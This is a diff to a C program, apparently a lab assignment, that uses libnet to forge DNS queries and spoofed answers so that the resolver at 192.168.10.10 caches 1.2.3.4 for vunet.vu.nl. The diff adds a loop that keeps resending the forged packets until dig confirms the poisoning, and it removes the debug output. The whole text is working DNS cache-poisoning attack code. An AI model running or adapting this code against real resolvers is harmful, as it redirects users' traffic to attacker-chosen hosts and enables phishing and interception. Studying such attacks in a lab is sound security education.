@@ -113,7 +113,7 @@ void send_dns_query(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
     strcpy(query.domain, DNS_QUERY_NAME);
     query.qtype = htons(1);  // Type A (Host address)
     query.qclass = htons(1); // Class IN
-    print_dns_question(&query);
+    //print_dns_question(&query);
 
     //Building DNS packet
    libnet_build_dnsv4(
@@ -174,7 +174,8 @@ void send_dns_query(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
     if (bytes_written == -1) {
         fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(l));
     } else {
-        printf("Sent DNS query packet.\n");
+        printf("\n");
+        
     }
 }
 
@@ -192,7 +193,7 @@ void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
     response.ttl = htonl(300);     // TTL
     response.rdlength = htons(4);  // Length of IP address
     inet_pton(AF_INET, SPOOFED_IP, response.rdata); // IP address to be spoofed
-    print_dns_answer(&response);
+    //print_dns_answer(&response);
 
 
    if(libnet_build_dnsv4(
@@ -254,13 +255,20 @@ void send_dns_response(libnet_t *l, uint16_t query_id, uint16_t resolver_port) {
     if (bytes_written == -1) {
         fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(l));
     } else {
-        printf("Sent DNS query response.\n");
+        printf("\n");
     }
 
 }
 
 
 int main(int argc, char *argv[]) {
+    FILE *fp;
+    char output[1035];
+    const char* target_ip = "1.2.3.4";
+    int max_retries = 5; // You can set this to the number of retries you want
+    int retry_count = 0;
+    int found = 0;
+
     if (argc != 5 || strcmp(argv[1], "-p") != 0 || atoi(argv[2]) != 1) {
         fprintf(stderr, "Usage: %s -p 1 <resolver-port> <query-ID>\n", argv[0]);
         return 1;
@@ -275,16 +283,45 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
         return 2;
     }
-
-    // Send DNS query
     send_dns_query(l, query_id, resolver_port);
+    send_dns_response(l, query_id, resolver_port);
+    //Set up a loop to keep re trying until the target IP is found or the max number of retries is reached
+      while (retry_count < max_retries && !found) {
+        fp = popen("dig @192.168.10.10 vunet.vu.nl +short", "r");
+        if (fp == NULL) {
+            printf("Failed to run command\n");
+            exit(1);
+        }
+        //Get the output from the dig command and check if the target IP is found
+        //If the target IP is found, set found to 1 to break out of the loop
+        while (fgets(output, sizeof(output), fp) != NULL) {
+            if (strstr(output, target_ip) != NULL) {
+                found = 1;
+                break;
+            }
+        }
+
+        pclose(fp);
+
+        //If the target IP is not found, increment the retry count and try again
+        if (!found) {
+            retry_count++;
+            // Sleep for a bit before retrying (e.g., 1 second)
+            send_dns_query(l, query_id, resolver_port);
+            send_dns_response(l, query_id, resolver_port);
+        }
+    }
+
+    if (found) {
+        printf("vunet.vu.nl %s\n", target_ip);
+    } else {
+        printf("\n");
+        
+    }
+    
 
     // Introduce a delay if needed (usleep uses microseconds)
     //usleep(500000); // 500 milliseconds delay
-
-    // Send DNS response
-    send_dns_response(l, query_id, resolver_port);
-    printf("vunet.vu.nl is at 1.2.3.4\n");
 
     libnet_destroy(l);
     return 0;
